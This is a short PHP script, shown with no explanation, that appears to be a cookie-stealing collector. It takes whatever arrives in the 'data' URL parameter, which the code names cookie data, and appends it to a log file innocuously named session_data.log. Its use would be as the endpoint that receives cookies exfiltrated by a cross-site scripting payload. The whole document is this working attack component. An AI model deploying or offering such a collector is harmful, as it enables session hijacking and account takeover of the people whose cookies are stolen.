<?php
    $cookie_data = $_GET['data']."\n";
    $cookie_file = fopen("./session_data.log","a");
    fwrite($cookie_file,$cookie_data);
    fclose($cookie_file);
?>